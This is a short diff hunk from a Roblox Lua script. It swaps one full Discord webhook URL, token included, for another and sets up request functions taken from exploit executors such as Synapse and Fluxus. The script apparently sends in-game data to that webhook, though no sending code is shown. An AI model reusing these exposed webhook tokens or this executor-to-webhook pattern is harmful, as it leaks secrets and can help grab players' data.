@@ -3,7 +3,7 @@ local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1398217578421288960/cY6i2E5MSNvEC43F0POP6_Y7p-1rTi-GxZxzHyYnmgFfLRz-oq_8nOwm8kqGS81U-mcv"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1455575137792295064/GnKVMsNIACnlGOx7Iu0IIlTRegYSq0-hGLX2ZI1ieS37E-ay9ur7Xo6UM5NVsd_QshlW"
 
 local requestFunc = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
 if not requestFunc then
